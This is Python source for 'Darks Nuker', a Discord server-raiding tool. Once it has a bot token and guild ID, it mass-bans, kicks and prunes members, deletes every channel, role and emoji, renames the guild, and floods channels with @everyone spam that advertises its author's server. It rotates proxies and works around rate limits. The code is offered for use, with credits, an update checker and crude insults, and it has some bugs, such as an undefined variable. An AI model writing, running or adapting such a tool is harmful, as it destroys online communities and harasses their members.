
#  _________  ___  ___  ________  ___       ___       ___  ___  ___  _____ ______      
# |\___   ___\\  \|\  \|\   __  \|\  \     |\  \     |\  \|\  \|\  \|\   _ \  _   \    
# \|___ \  \_\ \  \\\  \ \  \|\  \ \  \    \ \  \    \ \  \ \  \\\  \ \  \\\__\ \  \   
#      \ \  \ \ \   __  \ \   __  \ \  \    \ \  \    \ \  \ \  \\\  \ \  \\|__| \  \  
#       \ \  \ \ \  \ \  \ \  \ \  \ \  \____\ \  \____\ \  \ \  \\\  \ \  \    \ \  \ 
#        \ \__\ \ \__\ \__\ \__\ \__\ \_______\ \_______\ \__\ \_______\ \__\    \ \__\
#         \|__|  \|__|\|__|\|__|\|__|\|_______|\|_______|\|__|\|_______|\|__|     \|__|
                                                                                     
                                                                                     
# FUCK SKIDS 


from http import client
import threading, webbrowser, discord, random, httpx, json, time, os; from discord.ext import commands , tasks;from itertools import cycle 
import asyncio
import itertools


VERSION = '4.2'

dostilodepe = ["darks.4sure.", "DARKS NUKER <3", "DSC.GG/dr-op"]
leak = itertools.cycle(dostilodepe)

__intents__ = discord.Intents.default()
__intents__.members = True
__proxies__, darks, __config__, mohit= cycle(open("proxies.txt", "r").read().splitlines()), commands.Bot(command_prefix="+", intents=__intents__), json.load(open("config.json", "r", encoding="utf-8")), 45
os.system("cls") if os.name == "nt" else os.system("clear")
token = input("{}({}Darks{}) Enter Token{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
guildid = input("{}({}Darks{}) Guild ID{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
os.system("cls") if os.name == "nt" else os.system("clear")



Darks_art = """                                             
        {}##############################{}
         {}darks.4sure | DSC.GG/DR-OP{}
        {}##############################{}
        
        {}*DR BAAP HAI BRO!! LODA SUCK KRO DARKS KA*{}
        
{}(1){} {}Ban Members{}
{}(2){} {}Delete Channels{}
{}(3){} {}Kick Members{}
{}(4){} {}Prune Members{}
{}(5){} {}Channel Channels{}
{}(6){} {}Spam All Channels{}
{}(7){} {}Create Roles{}
{}(8){} {}Delete Roles{}
{}(9){} {}Delete Emojis{}
{}(10){} {}Rename Guild{}
{}(11){} {}Rename Channels{}
{}(12){} {}Rename Roles{}
{}(13){} {}Check Updates{}
{}(14){} {}Credits{}
{}(15){} {}Exit{}
{}(69){} {}DSC.GG/DR-OP{}
  
""".format("\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m",
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", 
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m",
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m",
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m",
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m",
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m",
            "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m", "\033[96m", "\x1b[0m")


                         



                            



                                                 







class Darks:
    def __init__(self):
        self.proxy = "http://" + next(__proxies__) if __config__["proxy"] == True else None
        self.session = httpx.Client(proxies=self.proxy)
        self.version = cycle(['v10', 'v9'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.chaizer = None

 
    def execute_ban_with_reason(self, guildid: str, member: str, token: str, reason: str):
        payload = {
            "delete_message_days": random.randint(0, 7),
            "reason": "Darks Nuker || dsc.gg/dr-op  "
        }
        while True:
            response = self.session.put(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/bans/{member}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Banned {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", member))
                self.banned.append(member)
                break
            elif "retry_after" in response.text:
                time.sleep(response.json()['retry_after'])
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            elif "Max number of bans for non-guild members have been exceeded." in response.text:
                print("{}({}!{}) Max number of bans for non-guild members have been exceeded".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to ban {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                break

    def execute_kick_with_reason(self, guildid: str, member: str, token: str, reason: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/members/{member}", headers={"Authorization": f"Bot {token}"}, json={"reason": "Darks Nuker || dsc.gg/nctop  "})
            if response.status_code in [200, 201, 204]:
                print("{}({}+{}) Kicked {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", member))
                self.kicked.append(member)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("                            {}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", member))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being excluded from discord API {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to kick {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", member))
                break
            
    
    def execute_prune(self, guildid: str, days: int, reason: str, token: str):
        payload = {
            "days": days,
            "reason": reason
        }
        response = self.session.post(f"https://discord.com/api/v9/guilds/{guildid}/prune", headers={"Authorization": f"Bot {token}"}, json=payload)
        if response.status_code == 200:
            print("{}({}+{}) Pruned {}{}{} members".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", response.json()['pruned'], "\x1b[0m"))
        elif "Max number of prune requests has been reached. Try again later" in response.text:
            print("{}({}!{}) Max number of prune reached. Try again in {}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", response.json()['retry_after']))
        elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
            print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
        else:
            print("{}({}-{}) Failed to prune {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", guildid))
            
            
    def execute_crechannels(self, guildid: str, channelsname: str, type: int, token: str):
        payload = {
            "type": type,
            "name": channelsname,
            "permission_overwrites": []
        }
        channelsname = channelsname.replace(" ", "-")
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 201:
                print("{}({}+{}) Created {}#{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", channelsname))
                self.channels.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}#{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channelsname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}#{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channelsname))
                break
            



    def execute_creroles(self, guildid: str, rolesname: str, token: str):
        colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
        payload = {
            "name": rolesname,
            "color": colors
        }
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Created {}@{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", rolesname))
                self.roles.append(1)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}@{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", rolesname))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to create {}@{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", rolesname))
                break
            
    
    def execute_delchannels(self, channel: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/channels/{channel}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 200:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", channel))
                self.channels.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                break
            
            
    def execute_delroles_with_reason(self, guildid: str, role: str, token: str, reason: str):
        retries = 0
        while retries < 5:  
            response = self.session.delete(
                f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/roles/{role}?reason={reason}",
                headers={"Authorization": f"Bot {token}"}
            )
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", role))
                self.roles.append(role)
                break
            elif "retry_after" in response.text:
                retry_after = float(response.json().get('retry_after', 1))
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", retry_after, "\x1b[0m"))
                time.sleep(retry_after)
                retries += 1
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", role))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from the Discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", role))
                break
            
    def execute_delemojis(self, guildid: str, emoji: str, token: str):
        while True:
            response = self.session.delete(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}/emojis/{emoji}", headers={"Authorization": f"Bot {token}"})
            if response.status_code == 204:
                print("{}({}+{}) Deleted {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", emoji))
                self.emojis.append(emoji)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", emoji))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to delete {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", emoji))
                break
 
    def rename_channels(self, guildid: str, new_channel_name: str, token: str):
        channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()

        def rename_channel(channel):
            if channel['type'] == 0:
                payload = {"name": new_channel_name}
                response = self.session.patch(
                    f"https://discord.com/api/v9/channels/{channel['id']}",
                    headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"},
                    json=payload
                )

                if response.status_code == 200:
                    print("{}({}+{}) Renamed {} To {}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", channel['name'], new_channel_name))
                else:
                    print("{}({}-{}) Failed Rename {} To {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", channel['name'], new_channel_name))

        threads = []
        for channel in channels:
            thread = threading.Thread(target=rename_channel, args=(channel,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
            
            
    def rename_roles(self, guildid: str, new_role_name: str, token: str, num_threads: int = 7):
        roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()

        def rename_role(role):
            try:
                payload = {"name": new_role_name}
                response = self.session.patch(
                    f"https://discord.com/api/v9/guilds/{guildid}/roles/{role['id']}",
                    headers={"Authorization": f"Bot {token}", "Content-Type": "application/json"},
                    json=payload
                )

                if response.status_code == 200:
                    print("{}({}+{}) Renamed Role {} To {}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", role['name'], new_role_name))
                else:
                    print("{}({}-{}) Failed to Rename Role {} To {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", role['name'], new_role_name))
            except Exception as e:
                print("{}({}-{}) An error occurred: {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", str(e)))

        threads = []
        for role in roles:
            thread = threading.Thread(target=rename_role, args=(role,))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
           
    
    def execute_massping(self, channel: str, content: str, token: str):
        while True:
            response = self.session.post(f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages", headers={"Authorization": f"Bot {token}"}, json={"content": content})
            if response.status_code == 200:
                print("{}({}+{}) Spammed {}{}{} in {}{}".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", content, "\x1b[0m", "\033[90m", channel))
                self.messages.append(channel)
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions {}{}".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", channel))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarly excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to spam {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", channel))
                break

    def execute_rename_guild(self, guildid: str, new_name: str, token: str):
        payload = {
            "name": new_name
        }
        while True:
            response = self.session.patch(f"https://discord.com/api/{next(self.version)}/guilds/{guildid}", headers={"Authorization": f"Bot {token}"}, json=payload)
            if response.status_code == 200:
                print("{}({}+{}) Guild renamed to {}{}".format("\x1b[0m", "\x1b[38;5;83m", "\x1b[0m", "\x1b[38;5;83m", new_name))
                break
            elif "retry_after" in response.text:
                print("{}({}!{}) Ratelimited. Delayed {}{}{}s".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m", "\x1b[38;5;208m", response.json()['retry_after'], "\x1b[0m"))
                time.sleep(float(response.json()['retry_after']))
            elif "Missing Permissions" in response.text:
                print("{}({}!{}) Missing Permissions for renaming guild".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            elif "You are being blocked from accessing our API temporarily due to exceeding our rate limits frequently." in response.text:
                print("{}({}!{}) You're being temporarily excluded from discord API".format("\x1b[0m", "\x1b[38;5;208m", "\x1b[0m"))
                break
            else:
                print("{}({}-{}) Failed to rename guild to {}{}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", "\x1b[31m", new_name))
                break

    
    def menu(self):
        os.system(f"cls & title Darks Nuker ^| Authenticated as: {darks.user.name}#{darks.user.discriminator}")
        print(Darks_art)
        ans = input("{}({}Darks{}) Option{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")) 
        
        if ans in ["1", "01"]:
            scrape = input("{}({}Darks{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            if scrape.lower() == "n":
                try:
                    guild = aizer.get_guild(int(guildid))
                    with open("members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except:
                    pass
            else:
                pass

            self.banned.clear()
            members = open("members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_ban_with_reason, args=(guildid, member, token, "Darks Nuker || dsc.gg/dr-op  ")) 
                t.start()
                while threading.active_count() >= mohit:
                    t.join()

            time.sleep(3)
            print("{}({}Darks{}) Banned {}/{}".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.banned), len(members)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["3", "03"]:
            scrape = input("{}({}Darks{}) Fetch IDs [Y/N]{}:{} ".format("\x1b[0m", "\033[90m", "\x1b[0m", "\033[90m", "\x1b[0m"))
            if scrape.lower() == "n":
                try:
                    guild = aizer.get_guild(int(guildid))
                    with open("members.txt", "w") as a:
                        for member in guild.members:
                            a.write("{}{}".format(member.id, "\n"))
                except:
                    pass
            else:
                pass

            self.kicked.clear()
            members = open("members.txt", "r").read().splitlines()
            for member in members:
                t = threading.Thread(target=self.execute_kick_with_reason, args=(guildid, member, token, "Darks Nuker || dsc.gg/dr-op  ")) 
                t.start()
                while threading.active_count() >= mohit:
                    t.join()

            time.sleep(3)
            print("{}({}Darks{}) Kicked {}/{}".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.kicked), len(members)))
            time.sleep(1.5)
            self.menu()
            
            
        elif ans in ["4", "04"]:
            days = int(1)
            reason = input("{}({}Darks{}) Reason{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            self.execute_prune(guildid, days, token , reason)
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["5", "05"]:
            type = input("{}({}Darks{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            chaizer = (input("{}({}Darks{}) Channels Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            amount = int(input("{}({}Darks{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            self.channels.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_crechannels, args=(guildid, (chaizer), type, token))
                t.start()
                while threading.active_count() >= mohit:
                    t.join()
                
            time.sleep(3)
            print("{}({}Darks{}) Created {}/{} channels".format("\x1b[0m", "\033[90m", "\x1b[0m", len(self.channels), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["7", "07"]:
            raizer = (input("{}({}Darks{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            amount = int(input("{}({}Darks{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            self.roles.clear()
            for i in range(amount):
                t = threading.Thread(target=self.execute_creroles, args=(guildid, (raizer), token))
                t.start()
                while threading.active_count() >= mohit:
                    t.join()
                
            time.sleep(3)
            print("{}({}Darks{}) Created {}/{} roles".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.roles), amount))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["2", "02"]:
            self.channels.clear()
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels:
                t = threading.Thread(target=self.execute_delchannels, args=(channel['id'], token))
                t.start()
                while threading.active_count() >= mohit:
                    t.join()
                
            time.sleep(3)
            print("{}({}Darks{}) Deleted {}/{} channels".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.channels), len(channels)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["8", "08"]:
            reason="Darks Nuker || dsc.gg/dr-op  "
            self.roles.clear()
            roles = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/roles", headers={"Authorization": f"Bot {token}"}).json()
            for role in roles:
                t = threading.Thread(target=self.execute_delroles_with_reason, args=(guildid, role['id'], token, "Darks Nuker || dsc.gg/dr-op  "))
                t.start()
                while threading.active_count() >= mohit:
                    t.join()

            time.sleep(3)
            print("{}({}Darks{}) Deleted {}/{} roles".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.roles), len(roles)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["9", "09"]:
            self.emojis.clear()
            emojis = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/emojis", headers={"Authorization": f"Bot {token}"}).json()
            for emoji in emojis:
                t = threading.Thread(target=self.execute_delemojis, args=(guildid, emoji['id'], token))
                t.start()
                while threading.active_count() >= mohit:
                    t.join()
                    
            time.sleep(3)
            print("{}({}Darks{}) Deleted {}/{} emojis".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.emojis), len(emojis)))
            time.sleep(1.5)
            self.menu()
            
        elif ans in ["6", "06"]:
            self.messages.clear(); self.channels.clear()
            amount = int(input("{}({}Darks{}) Amount{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            Aizer1 = (input("{}({}Darks{}) Content{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m")))
            Aizer = Aizer1 + ('\n @everyone `**DARKS NUKER | DARKS**` **Runs Cord** **DARKS PAPA AYE THY MOOT KAR CHALE GYE** https://discord.gg/E2ne6C6WNf  ')
            channels = self.session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers={"Authorization": f"Bot {token}"}).json()
            for channel in channels: self.channels.append(channel['id'])
            channelz = cycle(self.channels)
            for i in range(amount):
                t = threading.Thread(target=self.execute_massping, args=(next(channelz),(Aizer), token))
                t.start()
                while threading.active_count() >= mohit - 15:
                    t.join()
                    
            time.sleep(2)
            print("{}({}Darks{}) Spammed {}/{} messages".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", len(self.messages), amount))
            time.sleep(1)
            self.menu()

        elif ans in ["10"]:
            new_guild_name = input("{}({}Darks{}) Guild Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            self.execute_rename_guild(guildid, new_guild_name, token)
            time.sleep(1)
            self.menu()

        elif ans == "11":
            nchn = input("{}({}Darks{}) Channel Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            type = input("{}({}Darks{}) Channels Type ['t', 'v']{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            type = 2 if type == "v" else 0
            self.rename_channels(guildid, nchn, token)
            time.sleep(1)
            t = threading.Thread(target=self.execute_crechannels, args=(guildid, self.chaizer, type, token))
            t.start()
            self.menu()
            
        elif ans == "12":
            nrole = input("{}({}Darks{}) Role Name{}:{} ".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m"))
            self.rename_roles(guildid, nrole, token)
            time.sleep(1)
            t = threading.Thread(target=self.execute_crechannels, args=(guildid, self.chaizer,token))
            t.start()
            while threading.active_count() >= mohit:
                t.join()
            self.menu()

            

        elif ans == "13":
            try:
                response = self.session.get("https://github.com/AxZeRxD/Thallium-Nuker/releases/latest")
                check_version = response.headers.get('location').split('/')[7].split('v')[1]
                if VERSION != check_version:
                    print("{}({}Darks{}) You're using an outdated version!".format("\x1b[0m", "\033[90m", "\x1b[0m"))
                    webbrowser.open(f"https://github.com/AxZeRxD/Thallium-Nuker/releases/tag/{check_version}")
                else:
                    print("{}({}Darks{}) You're using the current version!".format("\x1b[0m", "\033[90m", "\x1b[0m"))
            except:
                print("{}({}Darks{}) Couldn't reach the releases!".format("\x1b[0m", "\033[90m", "\x1b[0m"))
            
            time.sleep(1.5)
            self.menu()

    
        
        elif ans == "14":
            print("{}({}Darks{}) Developed By darks.4sure. || Join :- https://discord.gg/E2ne6C6WNf   || You-tube :-  https://youtube.com/@pakontop459?si=79BrC6Xwb9T4zAGl".format("\x1b[0m", "\033[90m", "\x1b[0m"))
            input("")
            self.menu()
        
        elif ans == "15":
            print("{}({}Darks{}) Thanks for using Darks Nuker!".format("\x1b[0m", "\033[90m", "\x1b[0m"))
            time.sleep(1.5)
            os._exit(0)
            
    
@darks.event
async def on_ready():
    print("{}({}Darks{}) Authenticated as{}: {}{}".format("\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", "\x1b[38;5;122m", "\x1b[0m", f"{darks.user.name}#{darks.user.discriminator}"))
    update_status.start()

@tasks.loop(seconds=5)
async def update_status():
    virus = next(leak)
    await darks.change_presence(activity=discord.Game(name=virus))
    await asyncio.sleep(1.5)
    Darks().menu()

if __name__ == "__main__":
    try:
        os.system("title Darks Nuker ^| Authentication & mode")
        darks.run(token, bot=True)
    except Exception as e:
        print("{}({}-{}) {}".format("\x1b[0m", "\x1b[31m", "\x1b[0m", e))
        time.sleep(1.5)
        os._exit(0)



#  _________  ___  ___  ________  ___       ___       ___  ___  ___  _____ ______      
# |\___   ___\\  \|\  \|\   __  \|\  \     |\  \     |\  \|\  \|\  \|\   _ \  _   \    
# \|___ \  \_\ \  \\\  \ \  \|\  \ \  \    \ \  \    \ \  \ \  \\\  \ \  \\\__\ \  \   
#      \ \  \ \ \   __  \ \   __  \ \  \    \ \  \    \ \  \ \  \\\  \ \  \\|__| \  \  
#       \ \  \ \ \  \ \  \ \  \ \  \ \  \____\ \  \____\ \  \ \  \\\  \ \  \    \ \  \ 
#        \ \__\ \ \__\ \__\ \__\ \__\ \_______\ \_______\ \__\ \_______\ \__\    \ \__\
#         \|__|  \|__|\|__|\|__|\|__|\|_______|\|_______|\|__|\|_______|\|__|     \|__|
                                                                                     
                                                                                     
                                                                                     
